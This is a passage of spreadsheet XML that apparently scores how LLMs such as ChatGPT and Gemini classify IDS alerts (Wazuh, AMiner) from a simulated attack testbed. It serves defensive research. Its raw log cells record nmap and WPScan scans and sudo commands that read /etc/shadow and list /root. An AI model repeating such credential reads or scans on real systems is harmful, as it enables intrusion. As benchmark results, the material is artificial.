            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual frequency of apache access requests with headless browse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Resource Hijacking, </text:p>
            <text:p>Denial of Service</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unusual CPU usage increas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Command and Control</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probably based on unusual frequency of DNS querie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Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Initial Access, </text:p>
            <text:p>Web Shell</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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload</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2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</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Persistence</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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Credential Access</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ersistence, </text:p>
            <text:p>Privilege Escalation</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46])" office:value-type="float" office:value="93" calcext:value-type="float">
            <text:p>93</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_chatgpt_run5" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:number-columns-repeated="2" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co54" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co58" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co59" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co29" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:number-columns-repeated="3"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number-columns-repeated="2"/>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DNSteal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion, Persistence, Privilege Escalation, Initial Access”,</text:p>
            <text:p>Raw Data: “jonesmorgan-mail dovecot: imap-login: Login: user=&lt;susan.gregory&gt;, method=PLAIN, rip=192.168.128.170, lip=192.168.128.170, mpid=20031, TLS, session=&lt;Z7YRAMTVOOfAqICq&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated imap login attemp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Valid Account Usage</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084, TLS, session=&lt;kj6o/tnVnr3AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated imap login attemp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Protocol Anomaly, </text:p>
            <text:p>TLS Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “SURICATA TLS invalid handshake message”</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TLS Evasion, </text:p>
            <text:p>Encrypted Command and Control</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic”</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TLS Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid handshake message [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</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1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS Evasion, </text:p>
            <text:p>Beaconing over Encrypted Channel</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”</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Protocol Abuse, </text:p>
            <text:p>Encrypted Channel Misuse</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”, </text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</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Protocol Abuse, </text:p>
            <text:p>Encrypted Channel Misuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic”</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and invalid packet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Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Account Abuse</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188, TLS, session=&lt;ZPUbIdrV2L3AqIDD&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Valid Account Abuse</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346, TLS, session=&lt;XzJRP9rVHr7AqIDD&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Reconnaissance, </text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on a connection attempt without identification string</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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SSH Reconnaissance, </text:p>
            <text:p>Lateral Movement Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on a connection attempt without identification string; scanning behavior is not represented</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Abuse, </text:p>
            <text:p>SMTP Recon</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”, </text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name SMTP</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Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.” </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache and attempted access to forbidden file and directory</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Reconnaissance, </text:p>
            <text:p>Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260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Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “POST /sdk HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and tool name nmap</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Web Directory Enumeration</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tool name apache and attempted access to forbidden file and directory</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ordPress Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/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WordPress Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”,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Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/click-to-chat-for-whatsap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Web Application Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: "Vulnerability Scanning", id: "T1595.002", tactic: "Reconnaissance” </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/constant-contact-forms/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multiple HEAD requests to various WP plugins from same IP</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Plugin Enumeration, </text:p>
            <text:p>Web Application Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/better-wp-security/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access attempts to various WP plugin paths</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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Automated Plugin Enumeration,</text:p>
            <text:p>Web Application Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre - technique: "Vulnerability Scanning", id: "T1595.002”, tactic: “Reconnaissance” </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/ameliabooking/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and access attempts to various WP plugin paths</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WordPress Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”;</text:p>
            <text:p>Raw Data: “HEAD /?attachment_id=16 HTTP/1.1 404 323 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and access attempts to potential vulnerable paths like attachment_id indicating testing media attachments</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File Enumeration, </text:p>
            <text:p>WordPress Config Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “HEAD /wp-config.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access attempts to WordPress config file</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Directory Brute Forcing</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent directory and 404 http status code</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Log File Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,  </text:p>
            <text:p>Raw Data: “GET /access-log.1 HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent file and 404 http status code</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Web Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">IDS: “Multiple web server 400 error codes from same source ip”, </text:span><text:span text:style-name="T5">mitre -  technique: "Vulnerability Scanning”, id: "T1595.002”, tactic: "Reconnaissance”</text:span></text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and high frequency of such errors from the same IP</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Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to potential admin or backend access points (beheer = admin in dutch)</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Scanning, </text:p>
            <text:p>Brute Force Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to admin interfaces</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Web Application Scanning</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcart HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to admin interfaces</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Access to Protected Resources,</text:p>
            <text:p>Credential Access</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attempted access to forbidden file or directory</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Exploit Attempt,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/_vti_bin/_vti_aut/author.dll HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on access to author.dll indicating looking for known vulnerabilities</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Valid Account Use</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “miller-mail dovecot: imap-login: Login: user=&lt;megan.johnson&gt;, method=PLAIN, rip=192.168.129.212, lip=192.168.129.212, mpid=28005, TLS, session=&lt;o6XRidrVbpzAqIHU&gt;”</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Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Account Use</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648, TLS, session=&lt;5+7kjdrVtr7AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Aligns with IDS alert but not label</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Protocol Exploitation, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA HTTP unable to match response to request”,</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and potentially malformed HTTP traffic</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Protocol Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”, “SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol name TLS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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Brute Force</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User successfully changed UID.”, mitre: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IDS mitre classification and tool name su</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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Account Abuse</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”,  mitre: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IDS mitre classification</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Successful sudo to ROOT executed.”, mitre: technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation, Defense Evasion”</text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list”</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iscovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed”, mitre: technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation, Defense Evasion”</text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and access to /root directory</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>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 </text:p>
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”,  mitre: technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation, Defense Evasion”</text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and access to /etc/shadow directory</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B44])" office:value-type="float" office:value="85" calcext:value-type="float">
            <text:p>85</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="7"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_gemini_run5" table:style-name="ta1">
        <table:table-column table:style-name="co60" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1"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1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co65"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DNSteal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command and Control, </text:p>
            <text:p>Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”, “dnsmasq[14460]: forwarded youtu.be to [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on dnsmasq and high entropy in DNS domai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NSteal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on dnsmasq and high frequency of query records</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</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Brute Force,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=&lt;&gt;, rip=192.168.130.77, lip=192.168.128.195, session=&lt;hifuP9rVVNbAqIJN&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on login attempts without auth attempt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Application Access Attempt,</text:p>
            <text:p>Web Attack: Directory Traversal Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”,  “New path(es) detected”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on <text:s/>repeated unsuccessful access to web root director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Network Scan,</text:p>
            <text:p>Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “TLS error on connection from [IP] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol TLS and potential malformed TLS packet</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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scan,</text:p>
            <text:p>Web Application Attack,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap</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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scan,</text:p>
            <text:p>Web Application Attack,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache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Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “POST /sdk HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and 403 status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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”, </text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to known web application path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ning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache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2" calcext:value-type="float">
            <text:p>12</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">IDS: “New request method in Apache Access log.”, </text:span><text:span text:style-name="T5">“New value(s) detected” </text:span></text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-w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404 error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2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/themes/eCobiz/timthumb.php HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and 404 error cod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Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /javascript/jquery/.htpasswd_ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache and http status code 403</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formation Gathering, </text:p>
            <text:p>Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /javascript/jquery/@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Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to non-existent php script</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Path Traversal,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www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Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
